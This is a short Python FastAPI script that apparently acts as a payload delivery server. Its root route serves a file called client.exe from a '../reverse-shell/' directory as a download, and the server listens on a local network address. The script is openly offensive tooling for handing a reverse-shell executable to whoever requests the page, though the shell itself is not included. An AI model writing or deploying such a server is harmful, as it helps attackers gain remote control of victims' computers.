from fastapi import FastAPI
import uvicorn
from starlette.responses import FileResponse

app = FastAPI()

@app.get("/")
def root():
    return FileResponse("../reverse-shell/client.exe", media_type='application/octet-stream',filename="client.exe")


if __name__ == "__main__":
    uvicorn.run("index:app",host="192.168.29.100", port=8000,reload=True)